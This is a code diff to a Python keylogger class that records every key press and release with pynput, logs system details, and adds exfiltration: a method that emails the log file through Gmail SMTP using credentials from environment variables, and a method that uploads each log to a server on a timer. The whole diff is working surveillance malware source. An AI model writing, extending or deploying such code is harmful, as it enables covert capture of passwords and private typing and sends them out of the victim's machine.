@@ -3,13 +3,24 @@ import socket
 import platform
 import os
 import threading
+import smtplib
+import requests
+from unicodedata import name
 from pynput import keyboard
+from email.mime.multipart import MIMEMultipart
+from email.utils import formatdate, COMMASPACE
+from email.mime.application import MIMEApplication
+from datetime import datetime
 
+
+SERVER_URL = "127.0.0.1:8000"
 
 class KeyLogger():
     def __init__(self, interval, stop) -> None:
         self.interval = interval
         self.stop = stop
+        self.start_time = datetime.now()
+        self.end_time = datetime.now()
         self.log_number = 0
         self.create_log_dir()
 
@@ -17,31 +28,29 @@ class KeyLogger():
         if not os.path.exists("logs"):
             os.makedirs("logs")
     
+    def update_filename(self):
+        format_data = "%d-%m-%y-%H-%M-%S.%f"
+        start_time_str = datetime.strftime(self.start_time, format_data)
+        end_time_str = datetime.strftime(self.end_time, format_data)
+        self.filename = f"keylog-{start_time_str}_{end_time_str}"
+
     def config_logger(self):
         log = logging.getLogger()
         for handler in log.handlers:
             if isinstance(handler, logging.FileHandler):
                 log.removeHandler(handler)
     
-        file_handler = logging.FileHandler(f"logs/{self.log_number}.log", "a")
+        file_handler = logging.FileHandler(f"logs/{self.filename}.log", "a")
         formatter = logging.Formatter('%(asctime)s : %(message)s')
         file_handler.setFormatter(formatter)
         log.addHandler(file_handler)
         log.setLevel(logging.INFO)
 
-    def format_key(self, key):
-        try:
-            formatted_key = key.char
-        except:
-            formatted_key = key
-        finally:
-            return formatted_key
-
     def on_press(self, key):
-        logging.info(f"[PRESSED]: {self.format_key(key)}")
+        logging.info(f"[PRESSED]: {key}")
     
     def on_release(self, key):
-        logging.info(f"[RELEASED]: {self.format_key(key)}")
+        logging.info(f"[RELEASED]: {key}")
         if key == keyboard.Key.esc and self.stop == True:
             return False
     
@@ -57,9 +66,44 @@ class KeyLogger():
         logging.info(f"release: {platform.release()}")
         logging.info(f"architecture: {platform.architecture()}\n")
 
+    def send_mail(self):
+        email = os.getenv("EMAIL")
+        password = os.getenv("PASSWORD")
+
+        message = MIMEMultipart()
+        message["From"] = email
+        message["To"] = COMMASPACE.join([email])
+        message["Subject"] = "Keylogs"
+        message["Date"] = formatdate(localtime=True)
+
+        file = f"logs/{self.filename}.log"        
+        with open(file, "rb") as f:
+            part = MIMEApplication(
+                f.read(),
+                name=os.path.basename(file)
+            )
+        part["Content-Disposition"] = 'attachment; filename="%s"' % os.path.basename(file)
+        message.attach(part)
+
+        server = smtplib.SMTP(host="smtp.gmail.com", port=587)
+        server.starttls()
+        server.login(email, password)
+        server.sendmail(email, email, message.as_string())
+
+    def upload_file(self):
+        files = {"file": open(f"logs/{self.filename}.log", "rb")}        
+        response = requests.post(f"http://{SERVER_URL}/uploadfile/", files=files)
+        print(response.text)
+
     def report(self):
-        print("Sending mail")
+        self.end_time = datetime.now()
+        if self.log_number > 0:
+            # self.send_mail()
+            self.upload_file()
+            pass
         self.log_number += 1
+        self.update_filename()
+        self.start_time = datetime.now()
         self.config_logger()
         self.system_information()
         timer = threading.Timer(self.interval, self.report)
@@ -68,6 +112,7 @@ class KeyLogger():
     def run(self):
         keyboard_listener = keyboard.Listener(on_press=self.on_press, on_release=self.on_release)
         with keyboard_listener:
+            self.start_time = datetime.now()
             self.report()
             keyboard_listener.join()
 
